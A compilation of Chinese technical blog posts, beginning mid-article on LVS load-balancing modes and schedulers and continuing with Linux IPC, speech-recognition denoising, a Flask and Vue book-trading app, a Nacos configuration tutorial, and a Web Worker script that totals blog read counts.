 　　　　关于这种模式：
　　　　　　1）、VIP是公网地址，RIP和DIP是死亡地址，且通常不在同一网络，因此RIP的网关一般不会指向DIP；
　　　　　　2）、RS收到的请求报文地址是DIP，因此只需响应给DIP，但director还要将其发往client；
　　　　　　3）、请求和响应报文都经由director；
　　　　　　4）、支持端口映射；
　　　　这种模式就像DNAT，它通过同时修改请求报文的源IP地址和目标IP地址进行转发，另外此模式还不是正式版本，需要在官方网站下周源码，编译系统内核才能使用。
六、三种类型比较

 
七、LVS的调度方法scheduler
　　负载均衡器可用于做出该决定的调度方法分成两个基本的类别，静态调度和动态调度
　　1、静态调度，根据算法本身进行调度
　　　　1）RR:round robin，轮询
　　　　通过轮询的调度算法，就会分配的比较多，无论后端端真实服务器负载状态如何都会平均轮询调度。
　　　　2）WRR:weightd round robin,带权重的轮询
　　　　带权重的轮询
　　　　3）SH：source hashing源地址hash
　　　　将来自同一个ip的请求始终调度至同一RS
　　　　4）DH：destination hashing目标地址hash
　　　　将同一个目标的请求始终发往同一个RS
　　2、动态调度，根据算法及各RS的当前负载状态进行调度
　　　　1）、LC：least connection，最少连接
　　　　通过监控后端RS的连接数，根据TCP协议种的某些计算器来判断，将请求调度已建立的连接数最少后端的真实服务器上。
　　　　计算方法：overhead=active*256+lnactive，overhead越小，表示负载越低
　　　　2）、WLC：weight lc，加权的lc
　　　　计算方法：overhead=（active*256+lnactive）/weight
　　　　3）、SED：shortest expertion delay，最短期望延迟
　　　　计算方法:overhead=(active+1)*256/加权，数目最小，介绍下次请求。
　　　　4）、NQ：never queue，永不排队
　　　　无需排队，如果有台realserver的连接数=0就直接分配过去，不需要在进行sed运算，保证不会有一个主机很空闲。
　　　　5）、LBLC：locality-based least connection，基于本地的最小连接，为动态的DH算法
　　　　该算法根据请求的目标IP地址找出该目标IP 地址最近使用的real server，若该服务器是可用的且没有超载，就会使用“最少连接来挑选一台可用的服务器，将请求发送到该服务器。
　　　　6）、LBLCR：replicated lblc，带复制功能的lblc，是dh算法的一种改进
 　　　　该算法根据请求的目标IP地址对应的服务器组，按“最小连接”原则从服务器组种选出一台服务器，若服务器没有超载，将请求发送到该服务器；若服务器超载，则按“最小连接”原则从这个集群种选出一台服务器，将该服务器加入到服务器组中，将请求发送到该服务器，同时，当该服务器组有一段时间没被修改，将最忙的服务器从服务器组中删除，以降低复制的成都。
 
 
转载请注明出处：https://www.cnblogs.com/zhangxingeng/p/10497279.html 
********************************************************************************************************************************************************************************************************
进程间通信（IPC）
1.什么是进程间通信
　　通俗来讲，进程间通信就是：多个进程之间的数据交互
　　进程都有自己独立的虚拟地址空间，导致进程之间的数据交互变得十分困难，通信复杂了，但是安全性提高了；
　　进程间通信的本质：多个进程之间是否可以访问同一块内存/缓冲区
　　命令：ipcs：显示IPC信息   ipcrm：手动删除IPC资源
2.进程间通信的目的
　　数据传输：一个进程在某些情况下需要将自己的数据发送给另一个进程
　　资源共享：多个进程之间共享同样的资源
　　通知事件：一个进程可能向其他进程或进程组发送消息，表示发生了某个事件（如进程终止时会向父进程发送SIGCHILD信号）
　　进程控制：有些进程，例如DUBUG进程，希望完全控制另一个进程的执行，及时知道进程的状态改变
3.进程间通信的方式
　　1）管道：内核中的一块缓冲区，用于传输数据资源
　　　　匿名管道：内核开辟这段缓冲区的时候没有任何标记，操作系统只返回了该缓冲区的文件描述符供进程使用，对于其他进程，不知道这个文件描述，因此无法发问到这个缓冲区，
　　但是对于fork出来的子进程，由于子进程复制了父进程的程序地址空间，因此也复制了该缓冲区的文件描述符，也就意味着子进程可以和父进程进行数据传输，进行通信；
　　　　匿名管道的特点：只能用于具有亲缘关系的进程间通信、单向通信（半双工）、面向字节流
　　　　int pipe(int fd[2]);　　　　//用于创建匿名管道
　　　　参数：fd是文件描述符数组，其中放到fd[0]表示读端，fd[1]表示写端

　　　　　　因为管道是单向通信，所以操作系统无法决定到底是读还是写，所以返回两个文件描述符，一个用于读，一个用于写，这样一来，进程对管道是读还是写将由用户决定
　　　　选择读则关闭写，选择写则关闭读
　　　　命名管道：一类特殊的文件，可以用于同一机器上的所有进程之间的通信，拥有匿名管道的所有特性，但是命名管道需要用户自己打开文件；
　　　　　　创建命名管道：
　　　　　　　　命令行创建：mkfifo [filename]
　　　　　　　　int mkfifo(const char* filename, mode_t mode)
　　　　　　　　第一个参数：管道文件名称，第二个参数文件访问权限
　　　　　　命名管道和匿名管道的区别：打开方式不同，命名管道需要自己调用open打开，但匿名管道在调用pipe后，自动打开；
　　　　　　命名管道的打开规则：
　　　　　　　　当以读的方式打开命名管道时，阻塞知道有进程以写的方式打开文件；同样的如果以写的方式打开命名管道，则会阻塞知道有进程以写的方式打开
　　2）消息队列
　　　　操作系统内核中的队列，传输的是数据块，这个数据块是有类型的
　　　　操作系统为消息队列维护了一个结构体，这个结构体中有两个指针，msg_first与msg_last，分别指向消息队列的首部和尾部

　　　　消息队列函数：
　　　　　　int msgget(key_t key, int msgflg);
　　　　　　功能：用来创建和访问一个消息队列
　　　　　　参数：第一个参数，某个消息队列的名字，第二个参数，权限，类似于文件的权限
　　　　　　返回值：成功返回消息队列的标识码（非负整数），失败返回-1；

　　　　　　int msgctl(int msgqid, int cmd, struct msqid_ds *buf);
　　　　　　参数：第一个参数：由msgget函数返回的消息队列标识码，cmd:将要采取的动作（IPC_STAT, IPC_SET，IPC_RMID）
　　　　　　返回值：成功返回0，失败返回-1

　　　　　　msgsnd:此函数的作用，将一条消息添加到消息队列中
　　　　　　msgrcv：此函数表示将要从一个消息队列中接收消息
　　3）共享内存
　　　　进程间通信最快的一种方式，共享内存是在物理内存中开辟一段空间，映射到自己的虚拟地址空间，如果多个进程都进行了映射，则这些进程可以通过共享内存进行通信
　　实现数据共享
　　　　因为共享内存是直接对映射到虚拟地址的物理地址进行操作，少了两步由用户空间到内核空间，再由内核空间到用户空间数据的拷贝过程，因此是最快的；

　　　　共享内存的函数：
　　　　　　shmget：用来创建共享内存
　　　　　　　　int shmget(key_t key, size_t size, int shmflg);
　　　　　　　　参数：key：共享内存段的名字，size：共享内存的大小，shmflg：权限
　　　　　　shmat：将共享内存段连接到进程地址空间
　　　　　　　　void *shmat(int shmid, const void *shmaddr, int shmflg)；
　　　　　　　　参数：shmid：共享内存标识 shmaddr：指定连接地址，通常置为NULL，shmflg：SHM_RND SHM_RDONLY（只读）
　　　　　　　　返回值：成功返回指向共享内存的指针，指向共享内存的第一个字节；失败返回-1
　　　　　　shmdt：解除映射关系，将共享内存与当前进程脱离
　　　　　　　　int shmdt(const void* shmaddr);
　　　　　　　　参数：由shmat返回的指针
　　　　　　shmctl：用于控制共享内存
　　　　　　　　int shmctl(int shmid, int cmd, struct shmid_ds *buf);
　　　　　　　　参数：shmid为由shmget返回的共享内存表示码；cmd为将要采取的动作；buf：指向一个保存着共享内存模式状态和访问权限的数据结构
　　　　共享内存的操作步骤：
　　　　　　1.创建共享内存
　　　　　　2.将内存空间映射到虚拟地址空间
　　　　　　3.通过虚拟地址对内存进行操作
　　　　　　4.接触虚拟地址空间中的映射关系
　　　　　　5.删除共享内存
　　　　　　6.查看共享内存：ipcs -m
　　　　　　7.删除共享内存：ipcrm -mid
　　　　　　8.共享内存的使命周期随内核
　　4）信号量
　　　　信号量=计数器+等待队列
　　　　信号量这个计数器实际就说明现在是否可以访问资源，及表明当前有多少资源，信号量<0，表明需要等待，当有资源时唤醒等待，再进行操作
　　　　信号量的PV原语
　　　　　　互斥：P、V在同一进程中
　　　　　　同步：P、V在不同进程中
　　　　
 
 
　　
********************************************************************************************************************************************************************************************************
语音识别的降噪思路和总结
　　噪声问题一直是语音识别的一个老大难的问题，在理想的实验室的环境下，识别效果已经非常好了，之前听很多音频算法工程师抱怨，在给识别做降噪时，经常发现WER不降反升，降低了识别率，有点莫名其妙，又无处下手。
　　刚好，前段时间调到了AIlab部门，有机会接触这块，改善语音识别的噪声问题，虽然在此之前，询问过同行业的朋友，单通道近场下，基本没有太大作用，有时反而起到反作用，但是自己还是想亲身实践一下，至少找到这些方法失效的原因，看看是否在这些失败的原因里面，改进下思路，可能有新的发现；同时去Ailab，顺带把深度学习降噪实践一把，就算在ASR没有效果，以后还能用在语音通信这个领域。
　　任务的要求是保证声学模型不变动的情况下，即不重新训练声学模型，即单纯利用降噪来改善那些环境恶劣的样本，同时保证不干扰纯净语音或者弱噪声的语音场景，所以非常具有挑战性。
　　为了赶项目，用自己非常熟悉的各种传统的降噪方法：包括最小值跟踪噪声估计，MCRA， IMCRA，等各种噪声估计方法，以及开源项目 webrtc NS, AFE(ETSI ES 202 050 Advanced DSR Front-end Codec, two stages of Wiener filtering)，剩下的任务就是调参，经过很多次努力，基本没有什么效果，相反WER还会有1%点左右的增加。
分析对比了降噪和没有降噪的识别文本对比和频谱分析，总结了以下这些原因，希望对后面的人有些参考意义：
　　1.DNN本身就有很强的抗噪性，在弱噪声和纯净语音下，基本都不是问题。
通常场景下，这点噪声，用线上数据或者刻意加噪训练，是完全可以吸收掉的，只有在20db以下，含噪样本的频谱特征和纯净样本的频谱特征差异太大，用模型学习收敛就不太好，这时需要降噪前端。
　　2.降噪对于纯净语音或者弱噪声环境下，不可避免的对语音有所损伤，只有在恶劣的环境下，会起到非常明显的作用。
传统降噪是基于统计意义上面的一个处理，难以做到瞬时噪声的精准估计，这个本身就是一个近似的，粗略模糊化的一个处理，即不可避免的对噪声欠估计或者过估计，本身难把握，保真语音，只去噪，如果噪声水平很弱，这个降噪也没有什么用或者说没有明显作用，去噪力度大了，又会破坏语音。可以预见，根据测试集进行调参，就像是在绳子上面玩杂技。
我们的测试样本集，90%的样本都在在20db以上，只有200来条的样子，环境比较恶劣。所以通常起来反作用。
　　3.降噪里面的很多平滑处理，是有利于改善听感的，但是频谱也变得模糊，这些特征是否能落到正确的类别空间里面，也是存在疑问的。所以在前端降噪的基础上，再过一遍声学模型重新训练，应该是有所作用的，但是训练一个声学模型都要10来天，损失太大，也不满足任务要求。
　　4. 传统降噪，通常噪声初始化会利用初始的前几帧，而如果开头是语音，那就会失真很明显。
　　5.估计出噪声水平，在SNR低的情况下降噪，SNR高时，不处理或者进行弱处理，在中间水平，进行软处理，这个思路似乎可以行的通。
　　6.用基于声学特征的传统降噪方法，尝试过，在测试集里面，有不到1%的WER降低。
　　7.到底用什么量来指导降噪过程？既然降噪没法做好很好的跟踪，处理的很理想。即不可能处理的很干净，同时不能保证语音分量不会被损伤，即降噪和保证语音分量是个相互矛盾，同时也是一个权衡问题。那其实换个角度，降噪主要是改善了声学特征，让原来受噪声影响错分类的音素落到正确的音素类别，即降低CE。那么应该直接将降噪和CE做个关联，用CE指导降噪过程参数的自适应变化，在一个有代表性的数据集里面，有统计意义上的效果，可能不一定能改善听感，处理的很干净，但是在整体意义上，有能改善识别的。所以说语音去噪模块必须要和声学前端联合起来优化，目标是将去噪后的数据投影到声学模块接受的数据空间，而不是改善听感，即优化的目标是降低声学模型的CE,或者说是降低整条链路的wer，所以用降噪网络的LOSS除了本身的损失量，还应绑定CE的LOSS自适应去训练学习是比较合理的方案。也可以将降噪网络看成和声学模型是一个大网络，为CE服务，当然，这不一定是降噪网络，也可以是传统的自适应降噪方法，但是如果是基于kaldi开发，里面涉及到的工程量是很大的。
　　8.在整个语音识别体系中，由于声学模型的强抗噪性，所以单通道下的前端降噪似乎没有什么意义，1%左右的wer的改变，基本不影响整个大局，所以想要搞识别这块的朋友，应该先把重要的声学模型，语言模型，解码器，搞完之后，再来撸撸这块，因为即便没有单独的前端，整个识别大多数场景都是OK的，恶劣的场景比较少，一般场景大不了扩增各种带噪数据训练，也是可以的。
我们的线上数据，影响识别的因素排序是口语化，方言，短词，其次才是噪声，另外，少量混响，语速，音量，也是影响因素之一，以上是自己的一点片面之言，希望对大家有参考意义，少走弯路。
********************************************************************************************************************************************************************************************************
Flask + vue 前后端分离的 二手书App
一个Flask + vue 前后端分离的 二手书App
效果展示：
https://blog.csdn.net/qq_42239520/article/details/88534955
所用技术清单

项目地址：项目地址
vue代码地址：vue代码地址
项目部分过程笔记：
后台：
项目结构
Secondhanbook /   项目目录
    apps 
        v1
            __init__.py 导入 urls
            urls.py  路由配置
            forms.py
            models.py
            views
                user_views.py  用户相关视图
                book_vews.py 书籍相关视图
    config.py  配置文件
    run.py  项目启动文件
    manage.py  数据库迁移文件
    Secondhanbook.py  初始化文件 
    utils  工具类目录
        ......
    ......          
1. Flask_RESTful 的返回 和 缓存时候的自定义返回
flask_restful 在视图方法上加上marshal_with 装饰器，并传递你返回的模式。但当自定义时，需要返回自己的模式
return marshal(books,self.resource_fields,envelope='data')
    resource_fields:自定义返回模式
    data:  返回时，数据包装
2. 使用Flask_RESTful 下表单验证以及csrf防御
每当用户进入提交Post请求的页面，实例化一个表单form,返回csrf_token
csrf_token = form.csrf_token.current_token
 return restful.success(data=csrf_token)
3.路由配置
api = Api(prefix='/api')
#用户相关
api.add_resource(Login,'/login/',endpoint='login')  
......
#书籍相关
api.add_resource(BookAddView,'/bookadd/',endpoint='bookadd')
......
4.使用itsdangerous生成临时身份令牌
生成令牌
    def generate_auth_token(self,expiration=172800):#两天过期
        s = Serializer(config.BaseConfig.SECRET_KEY,expires_in=expiration)
        return s.dumps({'id':self.id})
身份检验
    def verify_auth_token(token):
        s = Serializer(config.BaseConfig.SECRET_KEY)
        try:
            data = s.loads(token)
        except Exception as e:
            return None
        user = FrontUserModel.query.get(data['id'])
        return user
5.配置文件的书写方式，类继承的方式
class BaseConfig(object):
    pass
class DevelopmentConfig(BaseConfig):
    pass
class OnlineConfig(BaseConfig):
    pass    
6. celery 处理费时任务
@celery.task
def send_mail(subject,recipients,user_id):
   ......
@celery.task
def BookCacheAdd(books):
    ......
7.redis 存储数据bytes 问题解决
cache = redis.StrictRedis(host='127.0.0.1',port=6379,db=0,decode_responses=True)
8. 封装jsonfy的返回
class HttpCode(object):
    Ok = 200
    ParamerError = 400
    Unauth = 401
    ServerError = 500
def RestfulResult(code,message,data):
    return jsonify({'code':code,'message':message,'data':data})
def success(message="",data=None):
    return RestfulResult(HttpCode.Ok,message=message,data=data)
......
9.对axios 提交bytes类型数据进行form验证
from werkzeug.datastructures import MultiDict
 ......
 myform = json.loads((request.data.decode('utf-8')))
 form = LoginForm(MultiDict(myform))
 ......
10. flask 接收 接收多个文件axios 上传的多个文件

**  AddBookView  ** 
 files = request.files
 for file in files.values():
     filename = upload.change_filename(secure_filename(file.filename))
     
**upload.vue**
      for (var i = 0; i < this.files.length; i++) {
        this.formdata.append('file' + i, this.files[i])
      }
      axios.post('api/bookadd/', this.formdata, {
        headers: {'Content-Type': 'multipart/form-data'}
      }).then(this.handleAxiosDone)
11.表单对files, 输入字段验证
from werkzeug.datastructures import CombinedMultiDict
form = Yourform(CombinedMultiDict([request.form,   request.files])) //  合并 数据和文件
文件验证：
定义表单时，采用FileField这个类型
验证器导入：flask_wtf.file   
flask_wtf.file.FileRequired 验证是否为空
flask_wtf.file.FileAllowed 验证上传文件后缀名
前台部分知识点：
项目结构
......
src
    common
        footer  页脚
        alert    提示
        fade        动画
        gallary  画廊
        ......
    store
        ... vuex相关  
    pages
        home
            components
                header.vue
                ......
            Home.vue
        detail
        me
        sign
        ......
......
1. flask_result 返回时，提供默认值
返回数据时，当axios 未返回渲染到页面时，使用变量出错。
**** 解决方法： 定义默认值 例如有使用book.owner.username , book.owner.avatar时，否则报错无定义,并无法显示。
      book: {
        owner: {......Object}
      },
2. vuex store一个Message,供于消息提醒
项目基本上每个页面都有操作结果的提醒，封装一个消息提醒的组件 alert.vue
 <div v-show="isshow" class="alertBox" :style="{background:this.$store.state.color}">
    {{mymessage}}
  </div>
......
  computed: {
    mymessage () {
      return this.$store.state.message
    }
  },
  watch: {
    mymessage (e) {
      this.isshow = true
    }
  }
  state: {
    message: '默认值',
    color: ''
  },
  mutations: {
    msgchange (state, res) {
      state.message = res.message    // color 自定义消息
      state.color = res.color  // color 自定义颜色
      setTimeout(() => {
        state.message = ''
        state.color = ''
      }, 3000)
    }
  }
  
**** 重点：必须重置，否则下一次一样的消息将不显示

组件写一个发送提醒消息的方法，方便多次调用
handleemit (message, color) {
  this.$store.commit('msgchange', {message: message, color: color})
}
3. 登陆注册：
利用 vue mounted 生命周期函数请求后端返回的csrf_token , 以及检验本地 localStorage，token是否过期。首次登陆成功返回存储token
 localStorage.setExpire('token', res.headers.token, 1000 * 60 * 60 * 24 * 2) // 设置两天过期
 注册发送email 激活账号
4 . 使用better-scroll 加载更多
swiper 盒子必须小于content高度才能滚动
可以滚动后，页面将不能点击，解决：****    
this.scroll = new BScroll(this.$refs.wrapper, {
      click: true,
      ......
监听下拉方法，加载更多
    pullUpLoad: {
      // 当上拉距离超过盒子高度的的时候,就派发一个上拉加载的事件（触发条件）
      threshold: 0
    }
监听事件
   this.scroll.on('pullingUp', () => {
     axios.get('/api/booklist/?start=' + this.start).then(this.handleAxiosSuccess)
   })
   
*** 对于下拉加载更多，双重遍历，遍历页码对应的数据
v-for="(p,index) in page" 
        v-for="item in booklist[index]" :key="item.id"   //  booklist[index] 为第几次下拉的返回的数据
5. vue-awesome-swiper
图片点击事件
监听事件：
 on: {
   click: function (e) {
     window.open(e.target.src) // 跳转到网页
   }
 }
 使用：
 <swiper :options="swiperOption">  swiperOption为参数{ loop: true,effect: 'fade'......}
   <!-- slides -->
   <swiper-slide v-for ='item of swiperList' :key="item.id">
     <img class="swiper-img" :src="item.url" alt=""> // 传递图片url
   </swiper-slide>
 </swiper>

画廊 组件关键参数：
 // observer启动动态检查器(OB/观众/观看者)，当改变swiper的样式（例如隐藏/显示）或者修改swiper的子元素时，自动初始化swiper。
  // 默认false
  observer: true,
  observeParents: true
6. 过滤器，传递data中的值，并且使用v-html 显示
v-html="$options.filters.filemotion(comment.content，emotions)"  //       emotions: [] 是data中自定义的值
本过滤器是对，表情的插入表情标签的过滤 [赞]  [哈哈]  替换成 图片
方法：
emotions格式 ：  
 filemotion (value, emotions) {
   value = value.replace(/(\[.+?\])/g, (e, e1) => {
     for (var i in emotions) {
       if ((emotions[i].value.indexOf(e1)) > -1) {
         return '<img src="' + emotions[i].icon + '">'
       }
     }
   })
   return value
 }
7. axios 更改请求头：
 axios.post('/api/comment/',参数, {
   headers: {
  'Content-Type': 'application/json'
    ......
   }
 })
8. Proxytable设置跨域，进行数据交互
    proxyTable: {
      '/api': {
        target: 'http://127.0.0.1:5000',  //目标接口域名
        changeOrigin: true,  //是否跨域
        pathRewrite: {
          '^/api': '/v1/api/'   //重写接口
        }
      }
    }
9.router 模式
路由 mode="history"模式
当前端项目结合到flask 项目中，当vue 路由为history模式时，出现“刷新页面报错404”的问题
这是因为这是单页应用…其实是因为调用了history.pushState API 所以所有的跳转之类的操作
都是通过router来实现的，解决这个问题很简单，只需要在后台配置如果URL匹配不到任何静态资源

进入新页面，不回到页面顶部解决：
  scrollBehavior (to, from, savedPosition) {
    return { x: 0, y: 0 }
  },

********************************************************************************************************************************************************************************************************
Spring Cloud Alibaba Nacos 入门
概览
阿里巴巴在2018年7月份发布Nacos, Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。并表示在6-8个月完成到生产可用的0.8版本,目前版本是0.9版本。
Nacos提供四大功能

服务发现和服务健康检查
Nacos使服务更容易注册自己并通过DNS或HTTP接口发现其他服务。Nacos还提供服务的实时健康检查，以防止向不健康的主机或服务实例发送请求。
动态配置管理
动态配置服务允许您在所有环境中以集中和动态的方式管理所有服务的配置。Nacos消除了在更新配置时重新部署应用程序和服务的需要，这使配置更改更加高效和灵活。
动态DNS服务
动态 DNS 服务支持权重路由，让您更容易地实现中间层负载均衡、更灵活的路由策略、流量控制以及数据中心内网的简单DNS解析服务。动态DNS服务还能让您更容易地实现以 DNS 协议为基础的服务发现，以帮助您消除耦合到厂商私有服务发现 API 上的风险。
服务和元数据管理
Nacos提供易于使用的服务仪表板，可帮助您管理服务元数据，配置，kubernetes DNS，服务运行状况和指标统计。

安装
Nacos安装可以采用如下两种方式：

1.官网下载稳定版本解压使用。
2.下载源代码编译使用，目前最新的版本是0.9.0版本。

本文使用第一种方式，到Nacos的稳定版本下载地址https://github.com/alibaba/nacos/releases，下载最新版，下载后解压即安装完成，然后进入解压目录后的bin目录。
unzip nacos-server-0.9.0.zip
或者
tar -xvf nacos-server-0.9.0.tar.gz
进入解压目录后的bin目录执行如下命令启动Nacos。
#Linux/Unix/Mac 下
sh startup.sh -m standalone
#Windows 下
cmd startup.cmd
启动成功后，访问Nacos服务，http://localhost:8848/nacos/#/login，默认情况用户名密码都是nacos，登录页如图所示。

登录后如图所示。

SpringBoot 使用 Nacos 配置管理
创建一个springboot项目，主要代码如下。
pom.xml
<dependency>
    <groupId>com.alibaba.boot</groupId>
    <artifactId>nacos-config-spring-boot-starter</artifactId>
    <version>0.2.1</version>
</dependency>
application.yml
spring:
  application:
    name: springcloud-nacos-hello

nacos:
  config:
    server-addr: 127.0.0.1:8848
配置说明：

spring.application.name：配置应用名。
nacos.config.server-addr：Nacos server 的地址。

启动类
在启动类，加入 @NacosPropertySource 注解其中包含两个属性，如下：

dataId：这个属性是需要在Nacos中配置的Data Id。
autoRefreshed：为true的话开启自动更新。

在使用Nacos做配置中心后，需要使用@NacosValue注解获取配置，使用方式与@Value一样，完整启动类代码如下所示。
@SpringBootApplication
@NacosPropertySource(dataId = "springcloud-nacos-hello", autoRefreshed = true)
@RestController
public class SpringcloudNacosHelloApplication {

    public static void main(String[] args) {
        SpringApplication.run( SpringcloudNacosHelloApplication.class, args );
    }

    @NacosValue(value = "${test.properties.useLocalCache:false}", autoRefreshed = true)
    private boolean useLocalCache;


    @GetMapping("/get")
    public boolean get(){
        return useLocalCache;
    }

}
启动应用，访问http://localhost:8080/get ，返回配置的默认值 “false”
使用Nacos修改配置
添加刚刚创建的data id 的服务，并将配置由 false 修改为 true，如图所示。

发布后，返回配置列表，出现新添加的配置，如图所示。

再次访问 http://localhost:8080/get ，返回值为 “true”。
数据源
经过了上边的一些简单操作，我们已经可以正常使用 Nacos 配置中心了。
但是不知道你有没有想过：配置数据是存在哪里呢？
我们没有对 Nacos Server 做任何配置，那么数据只有两个位置可以存储：

内存
本地数据库

重启了 Nacos server ，你会发现原先创建的配置依然，这说明不是内存存储的。
这时候我们打开NACOS_PATH/data，会发现里边有个derby-data目录，Derby 是 Java 编写的数据库，属于 Apache 的一个开源项目。我们的配置数据现在就存储在这个库中。
Derby 我们并不是很熟悉，但是数据源可以改为我们熟悉的 MySQL。具体的操作步骤如下。


创建一个名为nacos_config的 database。


将NACOS_PATH/conf/nacos-mysql.sql中的表结构导入刚才创建的库中。


修改NACOS_PATH/conf/application.properties文件，增加支持mysql数据源配置（目前只支持mysql），添加mysql数据源的url、用户名和密码。


spring.datasource.platform=mysql

db.num=1
db.url.0=jdbc:mysql://127.0.0.1:3306/nacos_config?characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true
db.user=root
db.password=root
再以单机模式启动nacos，nacos所有写嵌入式数据库的数据都写到了mysql了。
到这里SpringBoot使用Nacos配置中心就完成了，关于Nacos更多功能及详细使用，可以参看官方文档。
参考
https://nacos.io
https://www.cnblogs.com/forezp/p/10136433.html
源码下载
https://github.com/gf-huanchupk/SpringCloudAlibabaLearning

欢迎关注我的公证号，关注有惊喜~


********************************************************************************************************************************************************************************************************
Web Worker——js的多线程，实现统计博客园总阅读量
　　前言
　　众所周知，js是单线程的，从上往下，从左往右依次执行，当我们有耗时的任务需要处理时，便会阻塞线程造成页面卡顿等问题。web worker的目的，就是为JavaScript创造多线程环境，允许主线程将一些任务分配给子线程。在主线程运行的同时，子线程在后台运行，两者互不干扰。等到子线程完成计算任务，再把结果返回给主线程。因此，每一个子线程就好像一个“工人”（worker），默默地完成自己的工作。更多worker的介绍请戳：JavaScript标准参考教程
　　本文通过web worker 统计博客园总阅读量，来学习一下worker的使用，前段时间想看一下自己的博客有多少的阅读量，发现博客园好像没有提供这个统计功能，刚好之前有了解到worker，js的多线程，刚好适用于去统计总阅读量，又不影响我页面的渲染，主线程渲染页面，子线程负责循环请求博客园随笔列表进行统计，统计好了再将数据发送到主线程。详细思路如下：
　　主线程
　　1、先追加一个带id=‘statistical’的span标签，并显示“统计中...”
　　2、开启worker子线程开始统计，并且开始监听onmessage事件等待子线程返回数据
　　3、onmessage收到子线程返回的数据，更新id=‘statistical’的span标签的text值
　　子线程
　　1、循环使用XMLHttpRequest对象请求博客园随笔列表，直到最后一页（直到返回的页面没有文章数据）
　　2、使用正则处理、匹配数据（每篇文章的阅读量）存入全局变量中，并且判断是否最后一页，以便跳出循环
　　3、将收集到的数据进行数据清洗、相加得到总阅读量
　　4、将总阅读量推送给主线程，并结束子线程
 
　　代码编写
　　在开始写主线程之前，我们先实现子线程的任务
 
　　子线程
　　根据博客园目前的链接规则，访问个人博客主页的地址如下：http://www.cnblogs.com/huanzi-qch/，分页查看随笔列表的地址如下：https://www.cnblogs.com/huanzi-qch/default.html?page=1，并根据响应回来的页面内容格式用正则 /huanzi-qch\s+阅读[(]+[1-9]\d+[)]/g 去匹配，当然也可以用 /阅读[(]+[1-9]\d+[)]/g

 
　　我们对子线程进行如下封装，name值在主线程new Worker的时候构造：

    console.log("我是worker 任务线程 负责统计总阅读量..");
    //我的博客园地址名称
    var myCnblogsName = this.name;

    //监听主线程发送过来的数据
    //this.addEventListener('message', function (e) {
    //  this.postMessage('主线程发送过来的数据: ' + e.data);
    //}, false);

    //监听发送报错
    //this.addEventListener('messageerror ', function (e) {
    //  this.postMessage('发送数据到主线程报错: ' + e.data);
    //}, false);

    //加载其他 JS 脚本。
    //this.importScripts("")：

    //任务线程内部的全局变量数组，用于保存数据
    var statisticsArray = [];

    //发送ajax请求博客园
    function getReadData(page){
        //是否还要继续
        var flag = false;
        
        //使用XMLHttpRequest对象请求博客园 
        var xhr = new XMLHttpRequest();            
        xhr.open('GET', "https://www.cnblogs.com/"+myCnblogsName+"/default.html?page=" + page, false);//同步
        xhr.setRequestHeader("Content-Type", "text/html; charset=utf-8"); //设置响应格式
        xhr.onreadystatechange = function() {
          // readyState == 4说明请求已完成
          if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) { 
            //使用正则处理HTML字符串，需要设置全局标识
                //var myRe = /huanzi-qch\s+阅读[(]+[1-9]\d+[)]/g;
                var myRe = /阅读[(]+[1-9]\d+[)]/g;
                var resultArray = xhr.responseText.match(myRe);
                
                //合并到全局变量数组中
                statisticsArray = statisticsArray.concat(resultArray);
                
                //判断这个即可：resultArray.length > 0     如果还有文章集合，则返回true
                if(resultArray && resultArray.length > 0){
                    flag = true;
                }
          }
        };
        xhr.send();
        
        return flag;
    }


    //循环调用getReadData，默认最大页数 100 （100页，每页10条记录，相对于1000篇博客，已经够多了吧？）
    for(var i = 1;i < 100;i++){
        //如果返回false则立即跳出循环
        if(!getReadData(i)){ break;}
    }

    //处理全局数组
    for(var i = 0;i < statisticsArray.length;i++){
        if(statisticsArray[i]){
            //只保留数字部分
            statisticsArray[i] = statisticsArray[i].match(/[1-9]\d+/)[0];
        }else{
            statisticsArray.splice(i, 1);
        }
    }

    //数组求和，需要返回主线程的最终值
    //向产生这个 Worker 线程发送消息。
    var count = eval(statisticsArray.join("+"));
    this.postMessage(count);
    
    console.log("统计结束，总阅读量为："+count);

    //关闭 Worker 线程
    this.close();

 
 　　主线程
 　　刚开始我是想将子线程单独放在一个js文件里，上传到博客园后台管理的文件里，然后引入创建worker对象，不成想博客园门户地址跟保存用户上传文件的地址不同源，而worker受同源限制，导致无法创建对象

　　只能将子线程的代码放在同一个页面了，通过<script id="worker" type="app/worker"></script>包起来，通过读取这个script的内容成Blob二进制对象，然后二进制对象转为URL，再通过这个URL创建worker。
　　最后代码如下：

        // 先追加一个显示标签
        $("#profile_block").append("总阅读量：<span id='statistical' style='color: #464646;'>统计中...</span><br/>");
           
        //创建一个Blob，读取同个页面中的script标签
         var blob = new Blob([document.querySelector('#worker').textContent]);

        //这里需要把代码当作二进制对象读取，所以使用Blob接口。然后，这个二进制对象转为URL，再通过这个URL创建worker。
        var url = window.URL.createObjectURL(blob);

        //创建worker对象
        var worker = new Worker(url ,{ name : 'huanzi-qch'});

        //监听任务线程返回的数据
        worker.onmessage = function (event) {
            //设置总阅读量
            $("#statistical").text(event.data);
        }

        //error 事件的监听函数。
        worker.onerror = function (event) {
          console.log('error：' + event);
        }

        //messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
        worker.onmessageerror = function (event) {
          console.log('messageerror：' + event);
        }

        //发送数据到任务线程
        //worker.postMessage('Hello World');

 
　　效果演示
　　将所有代码都添加到 博客侧边栏公告 并保存


 
　　小扩展：既然添加了总阅读量，不如把积分、排名也放一起显示吧！
　　先前往 博客设置 --> 选项 勾选上“积分与排名”，然后加入以下js代码

        //隐藏博客园提供的积分与排名标签，并将内容迁移到指定位置
        $("#sidebar_scorerank").hide();
        $("#profile_block").append("积分：<span style='color: #464646;'>"+$("#sidebar_scorerank").find(".liScore").text().match(/[1-9]\d+/)[0]+"</span><br/>");
        $("#profile_block").append("排名：<span style='color: #464646;'>"+$("#sidebar_scorerank").find(".liRank").text().match(/[1-9]\d+/)[0]+"</span><br/>");

 
        
 
　　总结
　　通过这个小例子，我们以后看自己的博客情况也更加方便了，访问有侧边公告栏的页面都会统计总阅读量（不过这样会无形增加博客园服务器的压力 <手动羞涩脸>），并且也充分的感受到了worker的威力，之前js受限于单线程模型，无法充分发挥js的潜力，现在有了worker多线程，我们可以解锁更多姿势了！
　　更多对worker的介绍请戳：JavaScript标准参考教程。
 
　　统计任意博客总阅读量
